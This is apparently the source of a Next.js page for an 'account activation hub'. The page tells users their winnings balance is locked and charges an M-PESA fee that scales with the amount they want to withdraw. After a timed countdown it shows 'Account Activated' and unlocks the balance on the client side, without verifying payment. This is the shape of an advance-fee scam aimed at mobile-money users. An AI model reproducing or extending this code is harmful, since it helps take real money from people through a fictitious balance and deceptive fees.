"use client";
import React, { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import styled, { keyframes } from "styled-components";
import { useUser } from "@/context/UserContext";

const fadeIn = keyframes`
  from { opacity: 0; transform: translateY(15px); }
  to { opacity: 1; transform: translateY(0); }
`;

const PageWrapper = styled.div`
  min-height: 100vh;
  background-color: #0a0a0b;
  color: #ffffff;
  font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
  padding: 100px 20px 40px 20px;
  display: flex;
  flex-direction: column;
  align-items: center;
`;

const ContentContainer = styled.div`
  width: 100%;
  max-width: 600px;
  margin-top: 20px;
`;

const HeaderBar = styled.div`
  width: 100%;
  height: 70px;
  background: rgba(10, 10, 11, 0.95);
  backdrop-filter: blur(20px);
  color: #ffffff;
  display: flex;
  align-items: center;
  padding: 0 40px;
  box-sizing: border-box;
  position: fixed;
  top: 0;
  left: 0;
  z-index: 100;
  border-bottom: 1px solid rgba(255, 255, 255, 0.1);
  justify-content: space-between;
`;

const MainCard = styled.div`
  background: rgba(24, 24, 27, 0.7);
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 24px;
  padding: 40px;
  animation: ${fadeIn} 0.6s ease-out;
  position: relative;
  overflow: hidden;
  box-shadow: 0 15px 40px rgba(0, 0, 0, 0.6);

  &::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 4px;
    background: linear-gradient(90deg, #d4af37, #fef08a, #d4af37);
  }
`;

const Title = styled.h1`
  font-size: 1.8rem;
  font-weight: 950;
  margin-bottom: 8px;
  color: #ffffff;
  letter-spacing: -0.5px;
  text-transform: uppercase;
`;

const Subtitle = styled.p`
  font-size: 0.95rem;
  color: #94a3b8;
  margin-bottom: 30px;
  line-height: 1.6;
  font-weight: 600;
`;

const ActivateButton = styled.button`
  width: 100%;
  background: linear-gradient(90deg, #d4af37, #fef08a, #d4af37);
  color: #000;
  border: none;
  border-radius: 12px;
  padding: 18px;
  font-weight: 900;
  font-size: 1rem;
  cursor: pointer;
  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
  text-transform: uppercase;
  letter-spacing: 1px;
  box-shadow: 0 10px 20px rgba(212, 175, 55, 0.2);

  &:hover:not(:disabled) {
    transform: translateY(-2px);
    box-shadow: 0 15px 40px rgba(212, 175, 55, 0.3);
  }

  &:disabled {
    opacity: 0.5;
    cursor: not-allowed;
  }
`;

export default function ActivateAccount() {
  const router = useRouter();
  const { user, updateUser } = useUser();
  const [withdrawInput, setWithdrawInput] = useState<string>("");
  const [isProcessing, setIsProcessing] = useState(false);
  const [step, setStep] = useState<"initial" | "processing" | "waiting" | "success">("initial");
  const [timer, setTimer] = useState(25);

  // Calculate fee based on withdrawal amount
  const calculateFee = (amount: number) => {
    if (!amount || amount <= 0) return 0;
    if (amount < 100) return 100; 
    if (amount <= 1000) return 100;
    if (amount <= 5000) return 200;
    if (amount <= 10000) return 350;
    if (amount <= 15000) return 500;
    if (amount <= 20000) return 600;
    return 700; // 20k plus
  };

  const currentAmount = Number(withdrawInput) || 0;
  const activationFee = calculateFee(currentAmount);

  useEffect(() => {
    if (!user) {
      router.push('/login');
      return;
    }
    // Amount field starts empty per user request
    setWithdrawInput("");
  }, [user, router]);

  const handlePay = async () => {
    setIsProcessing(true);
    setStep("processing");

    try {
      const response = await fetch('/api/mpesa/stk', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phone: user?.phoneNumber || user?.phone,
          amount: activationFee,
          accountReference: "LIQUIDITY_UNLOCK"
        })
      });

      const data = await response.json();
      if (data.ResponseCode === "0") {
        setStep("waiting");
        
        const countdown = setInterval(() => {
          setTimer(prev => {
            if (prev <= 1) {
              clearInterval(countdown);
              handleSuccess();
              return 0;
            }
            return prev - 1;
          });
        }, 1000);
      } else {
        alert("Gateway Rejected: " + (data.errorMessage || data.error));
        setStep("initial");
        setIsProcessing(false);
      }
    } catch (err) {
      alert("Handshake Failed. Check Connection.");
      setStep("initial");
      setIsProcessing(false);
    }
  };

  const handleSuccess = () => {
    setStep("success");
    
    // Split logic: Set withdrawableBalance to the amount they chose to withdraw
    // Decrement the global balance by that amount
    const withdrawalAmount = Number(withdrawInput) || 0;
    const currentBalance = Number(user?.balance) || 0;
    const currentWithdrawable = Number(user?.withdrawableBalance) || 0;
    const newBalance = Math.max(0, currentBalance - withdrawalAmount);

    updateUser({ 
      isActivated: true,
      withdrawableBalance: currentWithdrawable + withdrawalAmount,
      balance: newBalance
    });

    localStorage.setItem("isActivated", "true");
    setTimeout(() => {
      router.push("/home");
    }, 2500);
  };

  if (!user) return null;

  return (
    <PageWrapper>
      <HeaderBar>
        <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
          <span 
            onClick={() => router.push('/home')} 
            style={{ cursor: 'pointer', color: '#ffffff', fontSize: '1.2rem', fontWeight: 900 }}
          >
            &larr;
          </span>
          <span style={{ fontWeight: 950, fontSize: '0.8rem', letterSpacing: '2px' }}>ACCOUNT ACTIVATION HUB</span>
        </div>
      </HeaderBar>

      <ContentContainer>
        <MainCard>
          {step !== "success" ? (
            <>
              <Title>Activate Your Account</Title>
              <Subtitle>
                To enable instant withdrawals and verify your M-PESA account, a one-time activation fee is required. 
                <b>Note:</b> The activation fee is dynamic and scales depending on the total amount you wish to withdraw today.
              </Subtitle>

              <div style={{ background: 'rgba(255, 255, 255, 0.05)', padding: '24px', borderRadius: '16px', border: '1px solid rgba(255,255,255,0.1)', marginBottom: '30px' }}>
                <div style={{ marginBottom: '20px', padding: '12px', borderLeft: '3px solid #d4af37', background: 'rgba(212, 175, 55, 0.05)', fontSize: '0.8rem', color: 'rgba(255,255,255,0.7)', lineHeight: '1.4' }}>
                  💡 <b>LIQUIDITY SPLIT:</b> Your account balance is currently locked. Entering a withdrawal amount and authorizing activation will unlock that specific amount into your <b>Withdrawable Balance</b> instantly.
                </div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '8px', marginBottom: '15px' }}>
                  <label style={{ color: '#94a3b8', fontSize: '0.85rem', fontWeight: 600 }}>Amount to Withdraw (Min 100):</label>
                  <input 
                    type="number" 
                    value={withdrawInput}
                    onChange={(e) => setWithdrawInput(e.target.value)}
                    style={{
                      background: 'rgba(0,0,0,0.3)',
                      border: '1px solid rgba(212, 175, 55, 0.3)',
                      borderRadius: '8px',
                      padding: '12px',
                      color: '#ffffff',
                      fontSize: '1.1rem',
                      fontWeight: '800',
                      outline: 'none'
                    }}
                    placeholder="Enter amount..."
                  />
                  <span style={{ fontSize: '0.65rem', color: '#d4af37', fontWeight: 700 }}>Withdrawal limit: KES {Number(user.balance).toLocaleString()}</span>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '15px' }}>
                  <span style={{ color: '#94a3b8', fontSize: '0.85rem', fontWeight: 600 }}>Activation Fee:</span>
                  <span style={{ fontWeight: 950, color: '#ffffff' }}>KES {activationFee.toLocaleString()}.00</span>
                </div>
              </div>

              {step === "initial" && (
                <ActivateButton 
                  onClick={handlePay} 
                  disabled={isProcessing || withdrawInput === "" || currentAmount < 100 || currentAmount > Number(user.balance)}
                >
                  {withdrawInput === "" ? "ENTER WITHDRAWAL AMOUNT" :
                   currentAmount < 100 ? "MIN WITHDRAWAL KES 100" : 
                   currentAmount > Number(user.balance) ? "LIMIT EXCEEDED" : 
                   `Authorize Activation (${activationFee} KES)`}
                </ActivateButton>
              )}

              {(step === "processing" || step === "waiting") && (
                <div style={{ textAlign: 'center', padding: '20px' }}>
                  <div style={{ fontSize: '1.2rem', fontWeight: 950, marginBottom: '10px', color: '#ffffff' }}>
                    {step === "processing" ? "CONNECTING..." : "CHECK YOUR PHONE"}
                  </div>
                  <div style={{ fontSize: '0.9rem', color: '#94a3b8', marginBottom: '20px', fontWeight: 600 }}>
                    {step === "processing" ? "Securing handshake with Safaricom..." : "Enter M-PESA PIN to complete activation."}
                  </div>
                  <div style={{ fontSize: '2.5rem', fontWeight: 950, color: '#d4af37' }}>{timer}s</div>
                </div>
              )}
            </>
          ) : (
            <div style={{ textAlign: 'center', padding: '40px 0' }}>
               <div style={{ fontSize: '3.5rem', marginBottom: '24px' }}>✅</div>
               <Title style={{ color: '#22c55e' }}>Account Activated</Title>
               <Subtitle>Your withdrawal channel is now fully operational. You can now withdraw your winnings instantly.</Subtitle>
               <div style={{ fontSize: '0.9rem', color: '#22c55e', fontWeight: 900, textTransform: 'uppercase', letterSpacing: '1px' }}>REDIRECTING TO DASHBOARD...</div>
            </div>
          )}
        </MainCard>
      </ContentContainer>
    </PageWrapper>
  );
}

